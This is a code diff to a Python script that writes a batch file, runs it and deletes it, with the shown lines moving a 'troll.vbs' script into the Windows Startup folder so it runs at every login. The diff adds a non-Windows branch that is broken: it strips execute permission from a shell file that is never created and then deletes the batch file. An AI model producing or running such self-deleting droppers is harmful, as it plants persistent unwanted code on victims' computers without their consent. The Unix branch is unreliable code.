@@ -1,4 +1,6 @@
 import os
+import platform
+system = platform.system()
 with open("AKAKKAKAKAK.bat", "a", encoding="utf-8") as file:
 	lines = []
 	lines.append("@echo off\n")
@@ -14,9 +16,15 @@ with open("AKAKKAKAKAK.bat", "a", encoding="utf-8") as file:
 	lines.append('move "troll.vbs" "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"\n')
 with open("AKAKKAKAKAK.bat", "w", encoding="utf-8") as file:
 	file.writelines(lines)
-os.system("AKAKKAKAKAK.bat")
-os.system("timeout /t 1 > nul")
-os.system("del AKAKKAKAKAK.bat")
+if system == "Windows":
+	os.system("AKAKKAKAKAK.bat")
+	os.system("timeout /t 1 > nul")
+	os.system("del AKAKKAKAKAK.bat")
+else:
+	os.system("chmod -x AKAKKAKAKAK.sh")
+	os.system("./AKAKKAKAKAK.sh")
+	os.system("sleep 1")
+	os.system("rm AKAKKAKAKAK.bat")
 
 
 
